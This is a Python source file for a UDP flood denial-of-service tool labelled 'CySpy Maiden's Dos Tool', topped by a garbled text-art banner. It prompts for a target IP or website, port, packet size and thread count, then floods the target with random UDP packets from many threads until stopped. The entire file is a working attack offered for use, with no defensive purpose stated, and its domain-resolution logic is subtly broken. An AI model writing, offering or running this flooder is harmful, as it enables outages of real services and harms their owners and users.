import socket
import random
import threading
import time
import sys
import requests
from urllib.parse import urlparse

banner = r"""
‚¢†‚¢§‚£§‚£§‚£§‚°§‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£§‚£§‚£§‚£§‚£§‚£§‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£ø‚£ø‚£Ø‚†ø‚£Ø‚£∑‚£Ø‚£á‚£§‚£Ñ‚¢†‚†Ä‚†Ä‚†Ä‚£§‚£§‚£§‚°è‚£ø‚°ø‚£ø‚†õ‚¢õ‚£ø‚£ø‚£ø‚£ß‚£§‚£§‚£§‚£§‚£§‚£§‚£Ä‚°Ä‚†Ä‚£†‚£§‚£Ä‚°Ä‚†Ä‚†Ä‚°Ä‚†Ñ‚£†‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£ø‚£ø‚†â‚†Ä‚†à‚†â‚†â‚¢π‚¢ø‚£ø‚£ø‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚¢≥‚°ø‚£ø‚£∑‚£∂‚£∂‚£ø‚£ø‚£â‚£π‚£ø‚£ø‚£ª‚†ø‚†ø‚¢ø‚£ø‚£Ω‚£ª‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚£ø‚£ø‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚£ø‚£ø‚£§‚†Ä‚°†‚£§‚°§‚£º‚£Ω‚£ø‚£ü‚£∂‚£¶‚£º‚£Ω‚£ø‚£ø‚°¥‚£º‚°ø‚°è‚†â‚¢ô‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£§‚£§‚£Ω‚£ø‚¢ø‚£ø‚£ø‚°ø‚£ø‚£ß‚£§‚£§‚£ø‚£ø‚°ø‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚¢ª‚£π‚£ø‚£ø‚£ø‚£ø‚°ü‚†õ‚†â‚£ª‚£ø‚°ø‚¢ø‚¢ø‚£Ω‚£ø‚£ø‚†ì‚¢Ø‚°ø‚£ø‚£ø‚¢ø‚£ø‚£ø‚°ø‚£ø‚£ø‚£ø‚£ø‚°ü‚†õ‚†õ‚†õ‚†õ‚†Ä‚†à‚£≥‚£ø‚£ø‚£ø‚°ø‚£ø‚°ø‚¢ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ø‚†ø‚¢ø‚£ø‚£ø‚£ø‚°ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†â‚†Ä‚†à‚†Ä‚†∏‚£ø‚£ø‚°ø‚£Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†£‚†ø‚£ø‚£ø‚£ø‚£ø‚£∑‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚¢Ω‚°ü‚†õ‚¢ø‚£∂‚†ü‚¢∑‚£Ñ‚†Ä‚£Ä‚£Ñ‚£¥‚°ø‚†õ‚£´‚£ø‚†ô‚¢π‚£ø‚°â‚¢õ‚°õ‚¢ø‚£Ñ‚†Ä‚¢∏‚¢π‚†ã‚£â‚†ô‚†è‚°Ø‚£∑‚°ö‚†ª‚£∂‚¢Ø‚†ã‚£ø‚†Ç
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°á‚¢∞‚£¶‚°†‚£∂‚†Ä‚£ø‚£æ‚£è‚†õ‚¢ã‚£¥‚°Ü‚¢∏‚£ø‚†Ä‚¢∏‚£ø‚†Ä‚¢ò‚£ø‚£¶‚°π‚£∑‚£º‚£ø‚†Ä‚°õ‚†â‚†â‚°ó‚£ø‚°á‚£µ‚£å‚†ô‚†Ä‚£ø‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°á‚¢∏‚£Ø‚†õ‚£ø‚†Ä‚£ø‚°û‚¢ã‚£¥‚£å‚†ô‚†á‚¢∏‚£ø‚†Ä‚†à‚£ø‚°Ä‚†∏‚†ø‚†ø‚†µ‚¢å‚£ø‚£ø‚°ê‚†Ω‚†ø‚°õ‚°á‚£ø‚°á‚¢π‚£ø‚£ø‚†Ä‚£ø‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚†Ω‚†Æ‚†ü‚†Ä‚£ø‚£Ñ‚£ø‚†ô‚†Æ‚†ø‚†ô‚†∑‚†∂‚†æ‚†ø‚†¥‚†¶‚†ø‚†¥‚†∂‚†∂‚†∂‚†∂‚†ø‚†ã‚†ò‚†´‚†∂‚†§‚†•‚†á‚†ª‚†µ‚†ß‚†á‚£ü‚£Ñ‚£ø‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ª‚¢Ω‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ô‚¢Ω‚†Ä

CySpy Maiden's Dos Tool
"""

print(banner)

# === User Input Section ===
print("=== Custom UDP DoS Tool ===")
target_input = input("Enter Target IP or Website URL: ").strip()

# Remove 'http://' or 'https://' from URL
if target_input.startswith("https://"):
    target_input = target_input[8:]
elif target_input.startswith("http://"):
    target_input = target_input[7:]

# Resolve domain using requests (better URL handling)
def resolve_domain(url):
    try:
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        return ip
    except Exception as e:
        print(f"‚ùå Could not resolve target: {e}")
        return None

# Try to resolve domain to IP
if "." in target_input:
    # Looks like an IP address
    target_ip = target_input
else:
    target_ip = resolve_domain(target_input)

if not target_ip:
    print("‚ùå DNS resolution failed. Please enter the IP address manually.")
    target_ip = input("Enter IP address: ").strip()

print(f"Resolved IP: {target_ip}")

try:
    target_port = int(input("Enter Target Port (e.g., 80): "))
    packet_size = int(input("Enter Packet Size (e.g., 1024): "))
    thread_count = int(input("Enter Number of Threads (e.g., 100): "))
except ValueError:
    print("‚ùå Invalid input. Use numbers only.")
    sys.exit()

# === DoS Logic ===
def udp_flood(target_ip, target_port, packet_size, thread_count):
    def attack():
        data = random._urandom(packet_size)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock.sendto(data, (target_ip, target_port))
                print(f"Sent packet to {target_ip}:{target_port}")
            except Exception as e:
                print(f"Error: {e}")
                break

    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        thread.start()

    print(f"\nüî• Started attack on {target_ip}:{target_port} with {thread_count} threads.\n")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nüõë Attack stopped by user.")
        sys.exit()

# Start the attack
udp_flood(target_ip, target_port, packet_size, thread_count)
